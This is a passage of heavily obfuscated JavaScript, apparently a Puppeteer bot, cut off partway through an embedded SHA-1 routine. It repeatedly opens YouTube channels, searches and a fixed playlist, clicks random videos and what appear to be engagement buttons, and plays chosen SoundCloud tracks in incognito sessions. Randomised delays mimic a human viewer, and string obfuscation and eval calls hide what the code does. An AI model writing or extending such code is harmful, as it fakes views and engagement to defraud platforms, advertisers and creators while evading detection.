function a() {
  const br = [
    'https://me',
    'lwj1DhrVBI1Yzq',
    'CMCVzw4VC2nYAq',
    'jtHdjuu1jtG1jq',
    'press',
    'mcaOv2LUzg93CW',
    'W5pdP8oUW60XjmkaWOnzja',
    'bSosbcZdSG',
    '.0\x20Safari/',
    'W5tcQhbwcSkaW41TW5BcPG',
    'DguTC2LNBI1PBG',
    'W5tcKSoVWRPLW4JcOxJdOWq',
    'contents',
    'Ahr0Chm6lY9NCG',
    'WQ/dTY7dGCoeW6NcS8o/zvu',
    'rMLYzwzVEa',
    'doDual',
    'noTs52D_Mw',
    'B20VmJjKB3DUlW',
    'gfbFW4dcK8oeWQddK3ZdTa',
    'DM5kvhL2ztjYlq',
    'hudcGIDJaa5UCv8',
    'XEFOREYrJg',
    'W7GhAmojW5OfE20cla',
    'DxrOlwz0lxjPAW',
    'ike\x20Gecko)',
    'zMXHDa',
    'AgvHzgvYCW',
    'AhjLzG',
    '#__hookedV',
    'dium.com/',
    'Dg8Vsu1eyL9nEq',
    'Chrome/',
    'at\x20happene',
    'Safari/537'
  ];
  a = function() {
    return br;
  };
  return a();
}
const a0 = c,
  Z = d,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0xa3d + -0x193c + -0x2 * -0x11bd))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0x1d59 + -0x1 * 0x853 + 0x12b * -0x12), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x23 * 0x43a + -0x506d + -0x7 * -0x719 + (0x40 * -0x1d + 0x2 * 0x8bc + 0x18 * 0x204) * random()) : await standardWaitForNetIdle(f), await wait(0xbed + 0x16cd + 0x1 * -0xf32 + (0x15b * -0xb + -0x39a1 + 0x1652 * 0x5) * random()), -0x1b87 + -0x11d7 + 0x2d5f;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x9a3 * 0x2 + -0x2cf * 0xb + 0x1f27 * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1107 + -0x20fb + 0xff5;
}
async function randomWait() {
  return await wait(0x1f6 * -0x11 + 0xd4f * 0x1 + 0x278f + (0x1588 + -0x1328 + 0x1128) * random()), 0x15b6 + -0x6ad + -0xf08;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x3fb + -0x1c71 + 0x206c, 0x26e1 + -0x26b9 + 0x3 * -0xb), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1 * -0x7d39 + 0xde * 0x94 + -0x1331) * getRandomInt(0xb * -0x6d + -0x889 + 0xd3a, -0x1 * -0xbcf + -0x1d69 * 0x1 + 0x1 * 0x119f), h)), -0x1 * 0x144e + 0x2 * -0xa03 + 0x2855;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xb66 + 0x365 + -0xecb;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x2329 * -0x1 + -0xb03 * 0x1 + 0x2e2d]['split']('\x20');
    for (let k = -0x5 * 0x6a3 + -0x19 * 0x11b + 0x3cd2; k < i['length']; k += -0x4b * -0x2c + 0x21 * 0x12e + -0x19e8 * 0x2)
      j += i[k] * h[i[k + (0xbf * 0x2 + 0x23 * 0x115 + -0x4 * 0x9d7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](R(0x7, 'n4H#')))['slice'](0x1768 + 0x1 * -0x1511 + -0x251)['map'](l => Array['from'](l['children']))['flat'](-0x598 + 0xe9 * -0x3 + -0xa4 * -0xd)['map'](l => l['childNodes'][-0x1620 + -0x158a + -0x63d * -0x7]['childNodes'][0x264f + -0xb63 + -0x1aec]['childNodes'][0xf31 * 0x1 + 0x608 + -0x1538]['childNodes'][-0x2 * -0x1129 + 0x1169 + 0x143 * -0x29]['childNodes'][-0x36a * 0x1 + -0x4 * 0x744 + 0x207b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l[S(0x1c)]);
  }), await wait(getRandomInt(0x1419 + -0x1 * 0x3fe + -0xc33, -0x8b * 0x3 + -0x47a + 0x19a3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x5206 * -0x1 + 0x4c9 * 0x3 + -0x7e43 * -0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x69db * -0x3 + -0xd63d + 0x2fe2e * 0x1) * getRandomInt(-0xa2c + -0x1fc5 + 0x29f3, 0x59 * -0x35 + -0x1285 + -0x24f7 * -0x1), h);
  return await wait(i), 0x1371 + -0x114b + 0x1 * -0x225;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const T = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => T(0xc) != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xffa + 0xab8 + 0x542]['children'][0x1 * 0x563 + 0x1 * -0x25e1 + 0x207e]['children'][-0xb7c + -0x13 * 0x19b + 0x29fd * 0x1]['children'][0x3 * -0x6ef + -0x1da + 0x16a7]['children'][-0x61 * -0x2b + -0xbf9 * -0x1 + -0x711 * 0x4]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2 * -0x1132 + 0xd + 0x4 * 0x896;
}
async function searchAndView(f) {
  const V = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x14 * -0x29 + -0xcb0 * -0x1 + -0xf80 + (0x15d * -0x15 + 0x6 * 0x51 + 0x71 * 0x3d) * random()
  }), await wait(-0x1519 + -0x1 * 0x453 + 0x1b60 + (-0x74b + 0x1ae7 + -0x2 * 0x938) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0x80e + 0x16 * 0x23 + 0x50e]['childNodes'][0x40 * 0x50 + 0x627 + -0x1a26]['childNodes'][-0xa * -0x39a + 0xf6f + 0x19b9 * -0x2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x8 * 0x20e + 0x8d + 0xfe8 * 0x1]['childNodes'][-0x65 * 0x24 + -0x1587 + 0x23bb]['childNodes'][0xd * 0xd3 + 0xd1 * 0x2 + -0xc57]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const U = c;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))[U(0x1a)](0x207f + 0x1 * 0x1c8f + -0x3d0d),
          r = -0x16e6 + 0x2 * 0x361 + 0x1024;
        for (let u = 0x1171 + 0xbcb + -0x1d3c; u < q['length']; u += -0x2701 + 0x26f1 + 0x12)
          r += q[u] * k[q[u + (-0x4 * -0x2b3 + -0x6f1 * 0x2 + -0x71 * -0x7)]];
        return r;
      }(n);
  });
  await wait((-0x600c + -0x1 * 0xa49 + 0xa4ed) * Math['random']()), await f['click'](V(0x1d) + 'idToClick');
  let i = Math['min']((-0x3 * 0x7344 + 0x7e57 * -0x3 + 0x3bf31) * getRandomInt(0x3 * 0x3dd + 0x1013 * 0x2 + -0x15de * 0x2, 0x23b2 + 0xdc8 + -0x3170), h + (0x21d4 + -0x1799 * -0x1 + 0x6d * -0x59));
  return await wait(i), 0x25b2 * -0x1 + 0x11a7 * 0x1 + 0x140c;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x10a3 * -0x1 + -0x187f + 0x2922);
    let h = e[f];
    if (c['fPgYzc'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2c8 + 0x1a9e + -0x1d66, r, s, t = 0xb05 + 0x39 * 0x10 + 0xe95 * -0x1; s = m['charAt'](t++); ~s && (r = q % (-0x1 * 0xa3d + -0x193c + -0x5 * -0x719) ? r * (-0x1 * -0x1d59 + -0x1 * 0x853 + 0xa63 * -0x2) + s : s, q++ % (0xc * 0x20e + -0xd68 + -0x2 * 0x59e)) ? o += String['fromCharCode'](0x26b * -0x1 + 0x1 * 0x5d3 + 0x1 * -0x269 & r >> (-(0xbed + 0x16cd + 0x1 * -0x22b8) * q & 0x53 * -0x17 + -0x1cd0 + 0x1e9 * 0x13)) : -0x1b87 + -0x11d7 + 0x2d5e) {
          s = n['indexOf'](s);
        }
        for (let u = 0x9a3 * 0x2 + -0x2cf * 0xb + 0xb9f * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1107 + -0x20fb + 0x1004))['slice'](-(0x1f6 * -0x11 + 0xd4f * 0x1 + 0x1409));
        }
        return decodeURIComponent(p);
      };
      c['yuJhiI'] = i, b = arguments, c['fPgYzc'] = !![];
    }
    const j = e[0x1588 + -0x1328 + -0x260],
      k = f + j,
      l = b[k];
    return !l ? (h = c['yuJhiI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const W = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1ba0 + 0x1530 + -0x67 * -0x10), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + W(0x1) + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xb9e + 0x1196 + -0x117c + (0x24e4 + -0x637 * 0x2 + -0x148e) * Math['random']());
    });
  }, 0x3 * -0x90b + -0x1 * 0x1a51 + 0x50ca);
  await wait(-0x2c74a + -0x76a2a + 0xec554);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * -0x19f1f + 0x13bd * -0x5 + -0x2 * -0x17618) * getRandomInt(-0x13ed * -0x1 + 0x4 * -0x223 + 0x1 * -0xb5d, -0xf9 * -0x4 + 0x6c7 + 0xb * -0xf6)), clearInterval(h), -0x1ba8 + 0x319 + 0x189 * 0x10;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1069 * -0x1 + 0x1de * -0xf + 0x2c6b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1ada + 0x4 + 0x1ad7;
    await randomWait();
  }
  return -0x879 * -0x4 + 0x16c + -0x83 * 0x45;
}

function fetchRandomSC() {
  const X = c;
  return Math['random']() <= -0x1bc * 0x2 + -0x1 * -0xf29 + -0xbb1 * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x621 + 0x1 * -0x1f1b + 0x129e * 0x2 + 0.2 ? 'https://so' + 'undcloud.c' + X(0x12) + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + X(0x18) + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * -0xc81 + 0x1b16 + 0x1 * -0xe95 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x392 + -0xd0 + 0x1 * -0x2c2;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x62 * -0x251 + 0x4c28 + -0x2 * -0xa351 + getRandomInt(0x3b73 + -0x1a05 * -0x3 + -0x1a * 0x309, -0x3767 * 0x4 + 0x20fb + -0x4f * -0x3df));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1 * -0x3bc + 0x2f * -0x53 + 0xb82 * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x224 + 0x3 * 0x2b3 + -0x5f5;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x19f2 + 0x42d * -0x4 + -0x67 * -0x6a, -0xb * -0x7d + -0x1 * 0x22d5 + 0x1da8)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xb03 + -0x257e + -0x1 * -0x3851 + floor((0x24ab + -0x37f * 0x4 + 0x13 * -0xfd) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x4 * 0xb1c424f + -0x767f4a2 * 0xf + 0x214f * 0x88326),
          0xb6066b + 0x8150 * 0x8 + -0x2864d * 0x17,
          -0xa928 + 0x6798 + -0x4 * -0x3064,
          -0x376 + 0x3 * -0x123 + 0x275 * 0x3
        ], y = [
          0x12f * -0xd + -0x5 * 0x607 + 0x16cf * 0x2,
          -0x5b6 * -0x1 + 0x1d77 + 0x59 * -0x65,
          -0x15a9 + -0x8ce + 0x25 * 0xd3,
          0x11 * -0x11 + -0x18a2 * -0x1 + -0xb * 0x223
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2354 + 0x3bd + 0x1f98)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0x153b + -0x1dec + 0x8b1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x549 * -0x3 + -0x2470 + 0x1 * 0x344b) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2b2 + 0x2 * 0x51e + -0xcee] = A[0x2605 + -0x11 * -0x173 + 0x2 * -0x1f4c] = A[-0xb5a + -0x87 * 0x5 + 0x18e * 0x9] = A[-0x368 + 0x3 * 0xae4 + -0x1d42] = A[-0x1cce + -0x1 * -0x9a9 + 0x1328] = A[-0xad * -0xd + -0x1f93 + 0x15 * 0x116] = A[0x5 * 0x631 + 0x10b2 + -0x2fa2 * 0x1] = A[-0x21bd * 0x1 + -0x1bae * -0x1 + 0x615] = A[-0xe45 + 0x504 + 0x948] = A[0x20bb + -0x151e + -0xb95] = A[-0x49 * 0x1e + 0x1ea1 * -0x1 + 0x8 * 0x4e7] = A[-0x61 * -0x43 + -0x8bb + 0x1 * -0x109e] = A[0x1026 + -0x15d8 + 0x5bd * 0x1] = A[-0x1 * 0x31e + -0x1a74 + -0xdf * -0x22] = A[-0x2 * -0x11c1 + -0x95 * 0x1c + -0x1329] = A[-0x5 * 0x4c7 + -0x1466 + 0x2c57] = A[-0x13bf + 0x1db * -0x1 + 0x15a9] = 0x1 * -0x26ea + 0x1 * -0x95f + -0x2f * -0x107, this['blocks'] = A) : this['blocks'] = [
                0xd1 * -0x27 + -0x232f + 0x4306,
                0xe * -0x105 + 0x1b82 + 0x79 * -0x1c,
                0x18d * -0x7 + -0xaab * -0x2 + -0xa7b,
                -0x17e1 + -0x33 * -0x9d + -0x766,
                -0x49 * 0x48 + -0x1f68 + -0x8a8 * -0x6,
                -0x604 + -0x39a + 0x4cf * 0x2,
                -0x33b * -0x5 + -0x2548 + 0x9 * 0x259,
                0x215f * 0x1 + -0x1826 + -0x939,
                0x1da0 + -0x151 * -0x19 + -0x3e89,
                -0x4 * -0x4e1 + 0x1 * 0x987 + -0x5 * 0x5cf,
                0x24b3 + -0x10c8 + -0x13eb,
                -0x170 * -0xa + -0x1 * 0x14e + -0xd12,
                -0xa * 0x375 + -0x1179 * -0x2 + -0x60,
                -0xbb9 + -0x2678 + 0x3231,
                0xb7 * -0x2f + 0x11a5 * -0x2 + 0x44e3,
                0x182 * -0x1 + -0x2245 + 0x23c7,
                -0x270e + -0x7eb * -0x1 + 0x1f23
              ], this['h0'] = 0xb2a0612f + -0x76f6b237 + -0x31 * -0xe3d359, this['h1'] = -0x29b99d * -0x5be + 0x16be7572a + 0x16bb17f27 * -0x1, this['h2'] = 0x44653ec3 + -0xf9fe564c + 0x14e53f487 * 0x1, this['h3'] = 0x5adf2ae + -0xdac786c + 0x1830da34, this['h4'] = 0x163ec4e7 * -0x8 + -0x1002ab6f9 + 0x1e2ef * 0x14def, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xa99 * -0x1 + 0x1a3c + -0x24d5, this['finalized'] = this['hashed'] = 0x1 * 0x463 + -0x3 * 0x8de + -0xb * -0x205, this['first'] = -0x1 * -0x337 + -0x268b + 0x2355;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x36c * -0x6 + 0x26f * -0x9 + 0x99 * 0x47, O = J['length'] || 0x2ab * 0x1 + 0x1a30 + -0x53 * 0x59, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x3 * 0x585 + -0x3 * 0x5dd + 0x42 * 0x4, P[0x28c + -0x1da7 * 0x1 + 0x1b1b] = this['block'], P[-0x3 * 0x4c5 + -0xc48 + 0x1aa7] = P[0xa90 + 0x1b0b + -0x1 * 0x259a] = P[-0xc * 0x151 + 0x2 * -0x11dd + 0x3388] = P[-0x24c6 * -0x1 + 0x1 * 0x1c1 + -0x2684] = P[0xd03 + -0xe * 0x212 + 0xffd] = P[-0x21dd + -0x1 * -0x5c9 + 0x1c19] = P[0xf * -0x47 + 0xc7c + 0x11 * -0x7d] = P[0x72b + -0xcc3 + -0x59f * -0x1] = P[0x2637 + -0xacb + 0x1b64 * -0x1] = P[0xf * -0x97 + -0x9f9 + 0x12db] = P[-0x2055 + 0x1 * -0x1d70 + 0x3dcf] = P[-0x2 * -0xfc2 + -0x1 * 0x101c + -0xab * 0x17] = P[0x55e + -0x1 * -0xc6c + -0x11be] = P[0x1631 + -0xf53 + -0x6d1] = P[0xb98 + -0x13b5 + -0x3 * -0x2b9] = P[-0x8 * 0x464 + -0x1 * -0x8f5 + 0x2ea * 0x9] = -0x15 * 0x89 + -0x2c7 * -0x1 + 0x876), K) {
                    for (N = this['start']; M < O && N < 0x1c * -0x6f + -0xdd9 + -0x8bf * -0x3; ++M)
                      P[N >> -0x149 + -0xfc9 + 0x1114] |= J[M] << y[0x427 + 0x89f * 0x2 + -0x1562 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2 * 0x11d7 + 0x1a5 * 0x6 + -0x2d4c; ++M)
                      (L = J['charCodeAt'](M)) < -0x2 * -0x341 + -0xb3 * 0x37 + 0x2073 ? P[N >> 0x15fd + -0xbf5 * -0x1 + -0x21f0] |= L << y[0xd * -0x16a + 0x266f + -0x156 * 0xf & N++] : L < 0xda8 + 0x2011 * -0x1 + 0x1a69 * 0x1 ? (P[N >> 0x25b * 0xd + -0x1a2e + -0xe3 * 0x5] |= (0xed6 + 0xc90 + -0x1aa6 | L >> -0x1f9d + -0x5 * 0x136 + -0x25b1 * -0x1) << y[0xa9 * -0x11 + -0xebe + 0x85 * 0x32 & N++], P[N >> -0xa1b + -0xbeb + 0x2f * 0x78] |= (0x212d + -0x14e9 + 0x2f1 * -0x4 | -0x1bec * -0x1 + 0x2e5 + -0x1e92 & L) << y[0x1 * 0xd1 + 0x3 * 0x59c + -0x8d1 * 0x2 & N++]) : L < -0x18a95 * 0x1 + 0x5b9e + -0x55 * -0x61b || L >= 0x5be6 + 0x1746 * -0x4 + 0xe132 ? (P[N >> -0x2eb * 0x1 + 0x29 * -0xde + 0x267b] |= (0x1 * -0x90 + -0x1f07 + 0x2077 * 0x1 | L >> 0x2e5 * 0x5 + -0x1df5 * 0x1 + -0x7 * -0x238) << y[0x1843 + 0x1e8f + -0x36cf & N++], P[N >> 0xbf6 * 0x1 + 0x2 * 0x5cb + 0x1 * -0x178a] |= (-0x24cc + 0x121 * 0x13 + -0xfd9 * -0x1 | L >> 0x445 + -0x5 * 0x2b4 + 0x945 & -0xf17 + 0x1 * -0xcd5 + 0x1c2b) << y[0xdf7 + -0x26ff + 0x190b & N++], P[N >> 0xc3e * 0x2 + 0x709 * -0x3 + -0x35f] |= (0x1edb + -0x794 + 0x11 * -0x157 | 0x1fb2 + 0x148c + -0x33ff & L) << y[-0x10a3 + -0x3 + 0x10a9 & N++]) : (L = 0xc1f * 0x21 + 0x1 * -0x1b112 + 0x12113 + ((0x2505 + 0x1b * 0x3d + -0x7 * 0x5a3 & L) << -0x1f63 * -0x1 + 0x1b80 + 0x5 * -0xbc5 | -0x1e77 + 0xa69 + 0x2f * 0x83 & J['charCodeAt'](++M)), P[N >> -0xcb + -0x2207 + -0x5ce * -0x6] |= (0x548 + -0x188c + 0x50d * 0x4 | L >> 0x3 * -0x9fe + 0x10b4 + 0xd58) << y[-0x40e + 0xf * 0xf2 + -0x35f * 0x3 & N++], P[N >> 0x5a7 * 0x1 + 0x131b + -0x18c0] |= (-0x1cfe + -0x7bf + 0x253d | L >> -0x12 * 0x1b2 + 0xd9f * -0x2 + 0x39ce & 0xa8 * 0x2f + 0x1c7b + -0x3b14) << y[-0x25 * -0x9a + 0xbd3 + 0xb2 * -0x31 & N++], P[N >> -0xf3e * -0x1 + -0x2388 + 0x144c] |= (-0xec * 0x1 + 0x79 * 0x5 + 0x1 * -0xf1 | L >> -0x2326 + -0x293 + 0x25bf & 0x21f8 + 0x1 * 0xb63 + 0x2 * -0x168e) << y[-0x3b0 * 0x7 + -0x8ec * -0x3 + 0xf1 * -0x1 & N++], P[N >> 0x2e7 * -0x2 + 0x259b + -0x1fcb] |= (0xd70 + -0xe99 + 0x1 * 0x1a9 | -0x5 * -0x599 + 0x1 * -0x21e6 + 0x628 & L) << y[-0x29 * 0x31 + -0x53a + -0x86 * -0x19 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x22f * -0x6 + -0xa * -0x15b + -0x34 * 0x1 ? (this['block'] = P[-0x7b5 + -0x959 * 0x2 + -0x1a77 * -0x1], this['start'] = N - (0x10e + -0x1149 + -0x107b * -0x1), this['hash'](), this['hashed'] = -0x5d1 + 0x2615 + -0x2043) : this['start'] = N;
                }
                return this['bytes'] > -0x9d762688 + -0xb114f7cb + 0x24e8b1e52 && (this['hBytes'] += this['bytes'] / (0x1cc5e31d4 + 0x18 * 0x10650f06 + 0x9575e699 * -0x4) << -0x2 * -0x3f7 + -0x59c + -0x16 * 0x1b, this['bytes'] = this['bytes'] % (0x1d1294744 + -0x36fe0d04 + -0x371f30 * 0x2cc)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x25c * -0x1 + -0x2bb + -0x60 * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
